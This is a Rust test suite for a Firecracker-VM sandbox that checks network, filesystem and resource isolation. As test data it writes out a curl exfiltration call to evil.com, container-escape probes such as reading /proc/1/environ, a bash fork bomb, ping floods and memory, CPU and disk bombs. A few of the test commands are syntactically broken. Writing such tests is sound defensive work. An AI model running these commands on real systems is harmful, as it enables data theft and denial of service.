use hephaestus_forge::sandbox::*;
use hephaestus_forge::types::*;
use std::collections::HashMap;
use tokio::test;

/// Test suite for Firecracker VM security validation
/// ZERO TOLERANCE: Must withstand container escape attempts

#[test]
#[cfg(feature = "sandboxing")]
async fn test_vm_startup_performance() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let start = std::time::Instant::now();
    let sandbox = HardenedSandbox::new(config).await;
    let duration = start.elapsed();
    
    assert!(sandbox.is_ok(), "VM initialization should succeed");
    assert!(duration.as_millis() < 50, 
           "VM startup took {}ms, must be <50ms", duration.as_millis());
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_memory_isolation_bounds() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 64, // Very limited memory
            disk_mb: 32,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Test module that tries to allocate more memory than allowed
    let memory_bomb = VersionedModule {
        id: ModuleId("memory_bomb".to_string()),
        version: 1,
        code: b"dd if=/dev/zero of=/tmp/bigfile bs=1M count=128".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.9,
            complexity_score: 0.5,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 10.0,
                memory_mb: 128,
                latency_p99_ms: 5000.0,
                throughput_ops_per_sec: 1,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 10000,
        environment: HashMap::new(),
    };
    
    let result = sandbox.execute_module(&memory_bomb, test_input).await;
    
    // Should either fail or be constrained by memory limits
    if let Ok(output) = result {
        // If it succeeded, it should have been constrained
        assert!(output.metrics.memory_used_mb <= 64, 
               "Memory usage exceeded limit: {}MB > 64MB", output.metrics.memory_used_mb);
    }
    // If it failed, that's also acceptable (OOM kill)
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_network_exfiltration_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 1,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Test various network exfiltration attempts
    let exfiltration_attempts = vec![
        ("http_exfiltration", b"curl -m 2 http://evil.com/exfiltrate".to_vec()),
        ("dns_exfiltration", b"nslookup google.com".to_vec()),
        ("ping_exfiltration", b"ping -c 1 8.8.8.8".to_vec()),
        ("wget_exfiltration", b"wget -T 2 http://example.com".to_vec()),
    ];
    
    for (test_name, code) in exfiltration_attempts {
        let test_module = VersionedModule {
            id: ModuleId(test_name.to_string()),
            version: 1,
            code,
            proof: None,
            metadata: ModuleMetadata {
                created_at: chrono::Utc::now(),
                risk_score: 1.0,
                complexity_score: 0.3,
                performance_profile: PerformanceProfile {
                    cpu_usage_percent: 5.0,
                    memory_mb: 10,
                    latency_p99_ms: 2000.0,
                    throughput_ops_per_sec: 1,
                },
            },
        };
        
        let test_input = TestInput {
            data: vec![],
            timeout_ms: 5000,
            environment: HashMap::new(),
        };
        
        let result = sandbox.execute_module(&test_module, test_input).await;
        
        // Network access should be blocked or fail
        match result {
            Ok(output) => {
                let output_str = String::from_utf8_lossy(&output.output);
                // Should contain error messages indicating network failure
                assert!(
                    output_str.contains("blocked") || 
                    output_str.contains("failed") || 
                    output_str.contains("timeout") ||
                    output_str.contains("unreachable") ||
                    !output.success,
                    "Network exfiltration test '{}' may have succeeded: {}", test_name, output_str
                );
            }
            Err(_) => {
                // Failure is acceptable for network isolation
            }
        }
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_container_escape_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Test known container escape techniques
    let escape_attempts = vec![
        ("proc_escape", b"cat /proc/1/environ".to_vec()),
        ("sys_escape", b"ls -la /sys/".to_vec()),
        ("dev_escape", b"ls -la /dev/".to_vec()),
        ("mount_escape", b"mount --bind /proc /tmp/proc".to_vec()),
        ("capability_dump", b"cat /proc/self/status | grep Cap".to_vec()),
        ("namespace_escape", b"ls -la /proc/self/ns/".to_vec()),
        ("cgroup_escape", b"cat /proc/self/cgroup".to_vec()),
        ("kernel_exploit", b"dmesg".to_vec()),
        ("module_load", b"modprobe test_module".to_vec()),
        ("ptrace_escape", b"strace -p 1".to_vec()),
    ];
    
    for (test_name, code) in escape_attempts {
        let test_module = VersionedModule {
            id: ModuleId(format!("escape_test_{}", test_name)),
            version: 1,
            code,
            proof: None,
            metadata: ModuleMetadata {
                created_at: chrono::Utc::now(),
                risk_score: 1.0,
                complexity_score: 0.7,
                performance_profile: PerformanceProfile {
                    cpu_usage_percent: 10.0,
                    memory_mb: 10,
                    latency_p99_ms: 1000.0,
                    throughput_ops_per_sec: 1,
                },
            },
        };
        
        let test_input = TestInput {
            data: vec![],
            timeout_ms: 3000,
            environment: HashMap::new(),
        };
        
        let result = sandbox.execute_module(&test_module, test_input).await;
        
        match result {
            Ok(output) => {
                let output_str = String::from_utf8_lossy(&output.output);
                
                // Check for signs of successful escape
                let suspicious_indicators = vec![
                    "root@", // Host root shell
                    "/host/", // Host filesystem access  
                    "docker", // Container runtime access
                    "runc", // Container runtime
                    "containerd", // Container runtime
                    "/var/lib/docker", // Docker host paths
                    "/proc/1/root", // Host init process
                ];
                
                for indicator in suspicious_indicators {
                    assert!(
                        !output_str.contains(indicator),
                        "Possible escape detected in test '{}': found '{}'", test_name, indicator
                    );
                }
                
                // Some escape attempts should be blocked at syscall level
                if test_name.contains("mount") || test_name.contains("ptrace") || test_name.contains("modprobe") {
                    assert!(
                        !output.success || 
                        output_str.contains("denied") || 
                        output_str.contains("not permitted") ||
                        output_str.contains("no such file"),
                        "Dangerous syscall in test '{}' should have been blocked", test_name
                    );
                }
            }
            Err(_) => {
                // Errors are acceptable for escape prevention
            }
        }
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_filesystem_isolation() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Test filesystem isolation
    let fs_tests = vec![
        ("root_filesystem", b"ls -la /".to_vec()),
        ("host_access", b"ls -la /host".to_vec()),
        ("proc_access", b"ls -la /proc/1/".to_vec()),
        ("sys_write", b"echo test > /sys/test".to_vec()),
        ("tmp_write", b"echo test > /tmp/test_file".to_vec()),
        ("dev_access", b"ls -la /dev/disk/".to_vec()),
    ];
    
    for (test_name, code) in fs_tests {
        let test_module = VersionedModule {
            id: ModuleId(format!("fs_test_{}", test_name)),
            version: 1,
            code,
            proof: None,
            metadata: ModuleMetadata {
                created_at: chrono::Utc::now(),
                risk_score: 0.7,
                complexity_score: 0.3,
                performance_profile: PerformanceProfile {
                    cpu_usage_percent: 5.0,
                    memory_mb: 5,
                    latency_p99_ms: 500.0,
                    throughput_ops_per_sec: 10,
                },
            },
        };
        
        let test_input = TestInput {
            data: vec![],
            timeout_ms: 2000,
            environment: HashMap::new(),
        };
        
        let result = sandbox.execute_module(&test_module, test_input).await;
        
        match result {
            Ok(output) => {
                let output_str = String::from_utf8_lossy(&output.output);
                
                // Certain operations should be restricted
                if test_name.contains("host") {
                    assert!(
                        !output.success || output_str.contains("No such file"),
                        "Host filesystem access should be blocked in test '{}'", test_name
                    );
                }
                
                if test_name.contains("sys_write") {
                    assert!(
                        !output.success || output_str.contains("Read-only") || output_str.contains("Permission denied"),
                        "Write to /sys should be blocked in test '{}'", test_name
                    );
                }
            }
            Err(_) => {
                // Errors are acceptable for filesystem isolation
            }
        }
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_execution_overhead() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 64,
            disk_mb: 32,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Simple execution that should be very fast
    let simple_module = VersionedModule {
        id: ModuleId("overhead_test".to_string()),
        version: 1,
        code: b"echo 'performance_test'".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.0,
            complexity_score: 0.0,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 0.1,
                memory_mb: 1,
                latency_p99_ms: 1.0,
                throughput_ops_per_sec: 1000,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 100,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&simple_module, test_input).await;
    let duration = start.elapsed();
    
    assert!(result.is_ok(), "Simple execution should succeed");
    assert!(duration.as_millis() <= 1, 
           "Execution overhead {}ms must be ≤1ms", duration.as_millis());
    
    if let Ok(output) = result {
        assert!(output.success, "Simple execution should complete successfully");
        assert!(String::from_utf8_lossy(&output.output).contains("performance_test"));
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_resource_limit_enforcement() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 0.5, // Very limited CPU
            memory_mb: 32,  // Very limited memory  
            disk_mb: 16,    // Very limited disk
            network_mbps: 1, // Very limited network
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // CPU intensive task
    let cpu_bomb = VersionedModule {
        id: ModuleId("cpu_bomb".to_string()),
        version: 1,
        code: b"yes > /dev/null".to_vec(), // CPU intensive
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.8,
            complexity_score: 0.2,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 100.0,
                memory_mb: 1,
                latency_p99_ms: 10000.0,
                throughput_ops_per_sec: 1,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 5000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&cpu_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Should either timeout or be killed by resource limits
    match result {
        Ok(output) => {
            // If it completed, should respect CPU limits
            assert!(output.metrics.cpu_usage_percent <= 60.0, // Allow some overhead
                   "CPU usage {}% exceeded limit", output.metrics.cpu_usage_percent);
        }
        Err(e) => {
            // Error due to resource limits is acceptable
            assert!(duration <= std::time::Duration::from_millis(5500));
        }
    }
}

#[test]
#[cfg(feature = "sandboxing")]  
async fn test_concurrent_vm_isolation() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 64,
            disk_mb: 32,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    // Create multiple sandboxes concurrently
    let mut handles = vec![];
    
    for i in 0..3 {
        let config_clone = config.clone();
        let handle = tokio::spawn(async move {
            let sandbox = HardenedSandbox::new(config_clone).await.unwrap();
            
            let test_module = VersionedModule {
                id: ModuleId(format!("concurrent_test_{}", i)),
                version: 1,
                code: format!("echo 'vm_{}' && sleep 1", i).into_bytes(),
                proof: None,
                metadata: ModuleMetadata {
                    created_at: chrono::Utc::now(),
                    risk_score: 0.1,
                    complexity_score: 0.1,
                    performance_profile: PerformanceProfile {
                        cpu_usage_percent: 1.0,
                        memory_mb: 5,
                        latency_p99_ms: 1000.0,
                        throughput_ops_per_sec: 1,
                    },
                },
            };
            
            let test_input = TestInput {
                data: vec![],
                timeout_ms: 3000,
                environment: HashMap::new(),
            };
            
            let result = sandbox.execute_module(&test_module, test_input).await;
            (i, result)
        });
        
        handles.push(handle);
    }
    
    // Wait for all to complete
    for handle in handles {
        let (vm_id, result) = handle.await.unwrap();
        assert!(result.is_ok(), "VM {} should execute successfully", vm_id);
        
        if let Ok(output) = result {
            let output_str = String::from_utf8_lossy(&output.output);
            assert!(output_str.contains(&format!("vm_{}", vm_id)));
        }
    }
}

#[test]
#[cfg(not(feature = "sandboxing"))]
async fn test_sandboxing_feature_required() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let result = HardenedSandbox::new(config).await;
    // Should succeed in creating the sandbox structure
    assert!(result.is_ok());
}

// =============================================================================
// DoS ATTACK PREVENTION VALIDATION TESTS
// =============================================================================

#[test]
#[cfg(feature = "sandboxing")]
async fn test_cpu_exhaustion_dos_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 0.5, // Very limited CPU
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // CPU bomb: infinite loop trying to consume all CPU
    let cpu_bomb = VersionedModule {
        id: ModuleId("cpu_bomb".to_string()),
        version: 1,
        code: b"while true; do : ; done".to_vec(), // Shell infinite loop
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 1.0, // Maximum risk
            complexity_score: 0.1,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 100.0, // Tries to use 100%
                memory_mb: 10,
                latency_p99_ms: 1000.0,
                throughput_ops_per_sec: 0,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 5000, // 5 second timeout
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&cpu_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Should either timeout or be killed by cgroup limits
    // Performance: overhead should be <0.1%
    let overhead_ms = duration.as_millis() as f64 - 5000.0;
    let overhead_percent = (overhead_ms / 5000.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Resource enforcement overhead {}% exceeds 0.1% limit", overhead_percent);
    
    if let Ok(output) = result {
        // If execution completed, CPU usage should be constrained
        assert!(output.metrics.cpu_time_ms <= 2500, // 50% of 5 seconds
               "CPU usage not properly constrained: {}ms", output.metrics.cpu_time_ms);
    }
    // If it failed due to resource limits, that's the expected behavior
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_memory_exhaustion_dos_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 64, // Very limited memory
            disk_mb: 32,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Memory bomb: rapidly allocate large amounts of memory
    let memory_bomb = VersionedModule {
        id: ModuleId("memory_bomb".to_string()),
        version: 1,
        code: b"python3 -c 'x=[0]*1000000; y=[x]*1000'".to_vec(), // Python memory bomb
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 1.0,
            complexity_score: 0.2,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 10.0,
                memory_mb: 1000, // Tries to use 1GB
                latency_p99_ms: 2000.0,
                throughput_ops_per_sec: 1,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 10000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&memory_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Should be terminated by OOM killer or memory limits
    let overhead_percent = (duration.as_millis() as f64 / 10000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Memory enforcement overhead {}% exceeds 0.1% limit", overhead_percent);
    
    if let Ok(output) = result {
        // Memory usage should be constrained to limit
        assert!(output.metrics.memory_used_mb <= 64,
               "Memory usage not constrained: {}MB > 64MB", output.metrics.memory_used_mb);
    }
    // OOM termination is expected and acceptable
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_io_exhaustion_dos_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 10, // Very limited I/O
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // I/O bomb: rapidly write large amounts of data
    let io_bomb = VersionedModule {
        id: ModuleId("io_bomb".to_string()),
        version: 1,
        code: b"dd if=/dev/zero of=/tmp/large_file bs=1M count=100".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.8,
            complexity_score: 0.3,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 20.0,
                memory_mb: 50,
                latency_p99_ms: 5000.0,
                throughput_ops_per_sec: 10,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 15000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&io_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Should be limited by I/O bandwidth constraints
    let overhead_percent = (duration.as_millis() as f64 / 15000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "I/O enforcement overhead {}% exceeds 0.1% limit", overhead_percent);
    
    if let Ok(output) = result {
        // Disk usage should be constrained
        assert!(output.metrics.disk_used_mb <= 10,
               "Disk usage not constrained: {}MB > 10MB", output.metrics.disk_used_mb);
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_network_flood_dos_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 1, // Very limited network bandwidth
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Network flood: attempt to saturate network bandwidth
    let network_bomb = VersionedModule {
        id: ModuleId("network_bomb".to_string()),
        version: 1,
        code: b"ping -f 8.8.8.8 &; curl -L https://httpbin.org/bytes/100000000".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.9,
            complexity_score: 0.4,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 30.0,
                memory_mb: 64,
                latency_p99_ms: 10000.0,
                throughput_ops_per_sec: 100,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 20000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&network_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Network should be rate-limited
    let overhead_percent = (duration.as_millis() as f64 / 20000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Network enforcement overhead {}% exceeds 0.1% limit", overhead_percent);
    
    if let Ok(output) = result {
        // Network usage should be constrained
        assert!(output.metrics.network_bytes_sent <= 1024 * 1024 * 20, // ~1MB/s * 20s
               "Network usage not constrained: {} bytes", output.metrics.network_bytes_sent);
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_fork_bomb_dos_prevention() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 1.0,
            memory_mb: 128,
            disk_mb: 64,
            network_mbps: 10,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Fork bomb: exponential process creation
    let fork_bomb = VersionedModule {
        id: ModuleId("fork_bomb".to_string()),
        version: 1,
        code: b":(){ :|:& };:".to_vec(), // Classic bash fork bomb
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 1.0, // Maximum risk
            complexity_score: 0.1,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 100.0,
                memory_mb: 100,
                latency_p99_ms: 1000.0,
                throughput_ops_per_sec: 0,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 3000, // Short timeout for dangerous code
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&fork_bomb, test_input).await;
    let duration = start.elapsed();
    
    // Should be terminated quickly by PID limits
    let overhead_percent = (duration.as_millis() as f64 / 3000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Fork bomb containment overhead {}% exceeds 0.1% limit", overhead_percent);
    
    // Fork bomb should be terminated, not succeed
    assert!(result.is_err() || 
           (result.is_ok() && result.unwrap().exit_code != 0),
           "Fork bomb should be prevented or terminated");
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_combined_resource_exhaustion_dos() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 0.5,
            memory_mb: 64,
            disk_mb: 32,
            network_mbps: 1,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Combined attack: CPU + Memory + I/O + Network
    let combined_bomb = VersionedModule {
        id: ModuleId("combined_bomb".to_string()),
        version: 1,
        code: b"#!/bin/bash
# CPU stress
yes > /dev/null &
# Memory stress  
python3 -c 'x=[0]*100000; y=[x]*100' &
# I/O stress
dd if=/dev/zero of=/tmp/stress bs=1M count=50 &
# Network stress
ping -f 8.8.8.8 &
wait".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 1.0,
            complexity_score: 0.6,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 100.0,
                memory_mb: 200,
                latency_p99_ms: 5000.0,
                throughput_ops_per_sec: 50,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 8000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&combined_bomb, test_input).await;
    let duration = start.elapsed();
    
    // All resources should be constrained with <0.1% overhead
    let overhead_percent = (duration.as_millis() as f64 / 8000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Combined attack containment overhead {}% exceeds 0.1% limit", overhead_percent);
    
    if let Ok(output) = result {
        // All resource limits should be enforced
        assert!(output.metrics.cpu_time_ms <= 4000, // 50% of 8 seconds
               "CPU not constrained: {}ms", output.metrics.cpu_time_ms);
        assert!(output.metrics.memory_used_mb <= 64,
               "Memory not constrained: {}MB", output.metrics.memory_used_mb);
        assert!(output.metrics.disk_used_mb <= 32,
               "Disk not constrained: {}MB", output.metrics.disk_used_mb);
    }
}

#[test]
#[cfg(feature = "sandboxing")]
async fn test_real_time_monitoring_effectiveness() {
    let config = SandboxConfig {
        isolation_type: IsolationType::FirecrackerVM,
        resource_limits: ResourceLimits {
            cpu_cores: 0.2, // Very strict limits
            memory_mb: 32,
            disk_mb: 16,
            network_mbps: 1,
        },
        network_isolation: true,
    };
    
    let sandbox = HardenedSandbox::new(config).await.unwrap();
    
    // Progressive resource consumption to test monitoring
    let monitoring_test = VersionedModule {
        id: ModuleId("monitoring_test".to_string()),
        version: 1,
        code: b"#!/bin/bash
# Gradually increase resource consumption
for i in {1..10}; do
  sleep 0.5
  # Increase CPU load
  timeout 0.1 yes > /dev/null
  # Increase memory
  python3 -c 'x=[0]*$(($i*10000)]'
  echo \"Step $i completed\"
done".to_vec(),
        proof: None,
        metadata: ModuleMetadata {
            created_at: chrono::Utc::now(),
            risk_score: 0.7,
            complexity_score: 0.4,
            performance_profile: PerformanceProfile {
                cpu_usage_percent: 50.0,
                memory_mb: 40,
                latency_p99_ms: 6000.0,
                throughput_ops_per_sec: 2,
            },
        },
    };
    
    let test_input = TestInput {
        data: vec![],
        timeout_ms: 12000,
        environment: HashMap::new(),
    };
    
    let start = std::time::Instant::now();
    let result = sandbox.execute_module(&monitoring_test, test_input).await;
    let duration = start.elapsed();
    
    // Monitoring should detect and prevent resource violations
    let overhead_percent = (duration.as_millis() as f64 / 12000.0 - 1.0) * 100.0;
    assert!(overhead_percent < 0.1, 
           "Monitoring overhead {}% exceeds 0.1% limit", overhead_percent);
    
    // Should be terminated before completing all steps
    if let Ok(output) = result {
        let output_str = String::from_utf8_lossy(&output.output);
        let completed_steps = output_str.matches("Step").count();
        assert!(completed_steps < 10, 
               "Monitoring should have prevented completion of all steps, got {}", completed_steps);
    }
}